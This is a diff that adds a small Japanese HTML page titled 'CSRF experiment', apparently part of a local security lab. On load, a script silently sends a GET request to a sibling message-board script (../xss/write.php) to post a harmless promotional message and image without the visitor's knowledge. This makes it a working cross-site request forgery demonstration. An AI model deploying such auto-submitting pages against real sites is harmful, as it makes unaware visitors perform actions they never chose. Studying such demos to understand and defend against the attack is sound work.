@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>CSRFの実験</title>
+	<link rel="stylesheet" type="text/css" href="css/style.css">
+</head>
+<body>
+
+<h1>おわかりいただけただろうか…。</h1>
+
+<script>
+window.onload = ()=>{
+	let message = "<a href='http://www.mcdonalds.co.jp/campaign/archive/2017/chickentatsuta/'>チキンタツタ</a>美味しい！ 一番好きなバーガーです！\n<img src='../csrf/image/chickentatsuta.png'>\n";
+
+	let xhr = new XMLHttpRequest();
+	xhr.open('GET', `../xss/write.php?message=${encodeURIComponent(message)}`, false);
+	xhr.send();
+}
+</script>
+
+</body>
+</html>
